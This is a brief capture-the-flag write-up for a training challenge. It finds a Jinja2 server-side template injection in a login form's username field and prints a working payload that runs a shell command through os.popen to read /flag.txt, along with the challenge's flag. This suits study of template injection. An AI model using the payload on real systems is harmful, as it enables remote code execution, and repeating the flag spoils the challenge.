## Scada

[Link to challenge](https://training.cybersecuritychallenge.pt/challenges#Scada-11)

Write-up:

1. We are given access to a web application that has a login form that allows for username input first,
and only allows for the password after submitting username.
Also, we are told the flag is at /flag.txt.

2. After some testing, we find that using `{{7*7}}` as the username shows 49, which indicates code is being executed. Attempting `{{7*'7'}}` displays '7777777', which indicates a Jinja2 template is being used.

3. Using the following payload in the username field shows us the flag: 

    `{{self.__init__.__globals__.__builtins__.__import__('os').popen("cat /flag.txt").read()}}` <br>
    Flag: **CSCPT{oh_ye4h_templ4tes_4re_c00l_and_s4f3}**